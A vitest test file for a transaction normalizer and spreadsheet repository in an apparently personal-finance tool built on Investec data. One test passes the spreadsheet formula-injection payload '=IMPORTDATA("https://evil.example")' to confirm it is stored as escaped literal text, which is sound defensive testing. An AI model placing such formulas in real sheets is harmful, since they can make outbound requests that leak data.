import { describe, expect, it } from 'vitest';
import { normalizeTransactionsResponse } from '../../src/investec/transactionNormalizer';
import { TransactionRepository } from '../../src/sheets/transactionRepository';
import { setupWorkbook } from '../../src/application/setupWorkbook';
import { FakeSheetGateway } from '../fakes/platform';
import type { Hasher } from '../../src/platform/ports';

const hasher: Hasher = { sha256: (value) => `hash:${value}` };

function response(transaction: Record<string, unknown>): string {
  return JSON.stringify({
    data: { transactions: [transaction] },
    links: { self: 'https://sandbox.example/transactions' },
    meta: { totalPages: 1 },
  });
}

describe('transaction normalization and identity', () => {
  it('normalizes the authoritative shape and applies debit sign', () => {
    const result = normalizeTransactionsResponse(
      response({
        accountId: 'account-1',
        type: 'DEBIT',
        transactionType: 'CardPurchases',
        status: 'POSTED',
        description: 'GROCERY',
        transactionDate: '2026-01-15',
        postingDate: '2026-01-16',
        amount: 250.5,
        runningBalance: 9750,
        postedOrder: 1,
        uuid: 'txn-1',
      }),
      'sandbox',
      'account-key',
      'account-1',
      'ZAR',
      new Date('2026-01-16T10:00:00.000Z'),
      hasher,
    );
    expect(result.rejected).toBe(0);
    expect(result.transactions[0]).toEqual(
      expect.objectContaining({
        Amount: -250.5,
        Currency: 'ZAR',
        'Provider Transaction ID': 'txn-1',
        'Identity Version': 'v1',
      }),
    );
  });

  it('uses a fallback identity when uuid is absent', () => {
    const result = normalizeTransactionsResponse(
      response({
        accountId: 'account-1',
        type: 'CREDIT',
        status: 'PENDING',
        transactionDate: '2026-01-15',
        amount: 100,
      }),
      'sandbox',
      'account-key',
      'account-1',
      'ZAR',
      new Date('2026-01-16T10:00:00.000Z'),
      hasher,
    );
    expect(result.transactions[0]).toEqual(
      expect.objectContaining({
        Amount: 100,
        'Provider Transaction ID': null,
        'Identity Version': 'v1-fallback',
      }),
    );
  });
});

describe('transaction repository identity promotion', () => {
  it('round-trips formula-like provider text as literal text', () => {
    const gateway = new FakeSheetGateway();
    setupWorkbook(gateway);
    const repository = new TransactionRepository(gateway);
    repository.upsert([
      { 'Row Key': 'formula-row', 'Description Raw': '=IMPORTDATA("https://evil.example")' },
    ]);
    expect(repository.list()[0]['Description Raw']).toBe('=IMPORTDATA("https://evil.example")');
    expect(gateway.getSheet('Transactions')?.readValues()[1]?.[10]).toBe(
      '\'=IMPORTDATA("https://evil.example")',
    );
  });

  it('preserves user-owned fields when a fallback row receives a uuid', () => {
    const gateway = new FakeSheetGateway();
    setupWorkbook(gateway);
    const repository = new TransactionRepository(gateway);
    repository.upsert([
      {
        'Row Key': 'fallback-key',
        'Provider Account ID': 'account-1',
        'Transaction Date': '2026-01-15',
        Amount: -100,
        'Transaction Type': 'CardPurchases',
        'Description Raw': 'SHOP',
        Category: 'Needs',
      },
    ]);
    repository.upsert([
      {
        'Row Key': 'uuid-key',
        'Provider Transaction ID': 'uuid-1',
        'Provider Account ID': 'account-1',
        'Transaction Date': '2026-01-15',
        Amount: -100,
        'Transaction Type': 'CardPurchases',
        'Description Raw': 'SHOP',
      },
    ]);
    expect(repository.list()).toEqual([
      expect.objectContaining({
        'Row Key': 'uuid-key',
        'Identity Alias': 'fallback-key',
        Category: 'Needs',
      }),
    ]);
  });
});
